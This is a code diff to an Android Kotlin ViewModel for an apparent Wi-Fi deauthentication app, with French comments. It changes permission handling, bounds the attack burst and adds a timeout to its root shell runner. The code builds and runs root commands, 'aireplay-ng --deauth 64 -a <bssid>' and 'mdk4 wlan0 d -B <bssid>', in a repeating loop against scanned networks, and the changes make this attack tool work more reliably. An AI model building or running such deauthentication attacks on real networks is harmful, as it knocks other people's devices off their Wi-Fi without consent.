@@ -11,7 +11,6 @@ import android.net.wifi.ScanResult
 import android.net.wifi.WifiManager
 import android.os.Build
 import android.util.Log
-import androidx.annotation.RequiresApi
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
@@ -106,15 +105,18 @@ class WifiDeautherViewModel : ViewModel() {
 
     private var deauthJob: Job? = null
 
-    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
-    private val requiredPermissions = mutableListOf(
-        Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION,
-        Manifest.permission.ACCESS_WIFI_STATE,
-        Manifest.permission.CHANGE_WIFI_STATE,
-        Manifest.permission.ACCESS_NETWORK_STATE
-    ).apply {
-        add(Manifest.permission.NEARBY_WIFI_DEVICES)
+    // NEARBY_WIFI_DEVICES n'existe (et ne peut être accordée) qu'à partir d'Android 13
+    // (API 33). L'exiger inconditionnellement bloquait le scan sur les versions
+    // antérieures : la permission n'étant jamais accordée, "all granted" restait faux.
+    private val requiredPermissions: List<String> = buildList {
+        add(Manifest.permission.ACCESS_FINE_LOCATION)
+        add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        add(Manifest.permission.ACCESS_WIFI_STATE)
+        add(Manifest.permission.CHANGE_WIFI_STATE)
+        add(Manifest.permission.ACCESS_NETWORK_STATE)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            add(Manifest.permission.NEARBY_WIFI_DEVICES)
+        }
     }
 
     /**
@@ -123,7 +125,6 @@ class WifiDeautherViewModel : ViewModel() {
      * @param context Contexte Android
      */
 
-    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     fun initialize(context: Context) {
         this.context = context
         wifiManager = context.getSystemService(Context.WIFI_SERVICE) as WifiManager
@@ -236,7 +237,6 @@ class WifiDeautherViewModel : ViewModel() {
      * Verifie si toutes les permissions necessaires sont accordées
      * (ACCESS_FINE_LOCATION, ACCESS_WIFI_STATE, etc.)
      */
-    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     private fun checkPermissions() {
         context?.let { ctx ->
             val missingPermissions = requiredPermissions.filter { permission ->
@@ -359,7 +359,10 @@ class WifiDeautherViewModel : ViewModel() {
             // Interface moniteur présumée ; à adapter selon l'appareil.
             val iface = "wlan0"
             val command = when (tool) {
-                "aireplay-ng" -> "aireplay-ng --deauth 0 -a ${network.bssid} $iface"
+                // Salve bornée (64 trames) au lieu de --deauth 0 (infini) : la boucle
+                // relance la commande chaque seconde, une commande infinie ne rendrait
+                // jamais la main.
+                "aireplay-ng" -> "aireplay-ng --deauth 64 -a ${network.bssid} $iface"
                 else -> "mdk4 $iface d -B ${network.bssid}"
             }
             _deauthStatus.value = "Deauthing ${network.ssid} (${network.bssid}) ch ${network.channel} via $tool..."
@@ -408,15 +411,40 @@ class WifiDeautherViewModel : ViewModel() {
         return null
     }
 
-    /** Exécute une commande shell root et retourne son code de sortie. */
-    private fun runRootCommand(command: String): Int {
+    /**
+     * Exécute une commande shell root et retourne son code de sortie.
+     *
+     * Draine stdout/stderr en arrière-plan (sinon un outil bavard remplit le buffer
+     * du pipe et se bloque) et borne la durée de la salve : mdk4 (et aireplay en mode
+     * continu) tourneraient indéfiniment et waitFor() ne rendrait jamais la main.
+     */
+    private fun runRootCommand(command: String, timeoutMs: Long = 2000): Int {
+        var process: Process? = null
         return try {
-            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
-            process.waitFor()
+            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
+            process = p
+            drainStream(p.inputStream)
+            drainStream(p.errorStream)
+            val watchdog = Thread {
+                try { Thread.sleep(timeoutMs) } catch (_: InterruptedException) { return@Thread }
+                try { p.destroy() } catch (_: Exception) {}
+            }.apply { isDaemon = true; start() }
+            val code = p.waitFor()
+            watchdog.interrupt()
+            code
         } catch (e: Exception) {
             Log.e("WifiDeauther", "Deauth command failed: ${e.message}")
+            try { process?.destroy() } catch (_: Exception) {}
             -1
         }
+    }
+
+    /** Vide un flux de process en arrière-plan (thread daemon) pour éviter les blocages. */
+    private fun drainStream(stream: java.io.InputStream) {
+        Thread {
+            try { stream.bufferedReader().use { r -> while (r.readLine() != null) { /* ignore */ } } }
+            catch (_: Exception) {}
+        }.apply { isDaemon = true; start() }
     }
 
     override fun onCleared() {
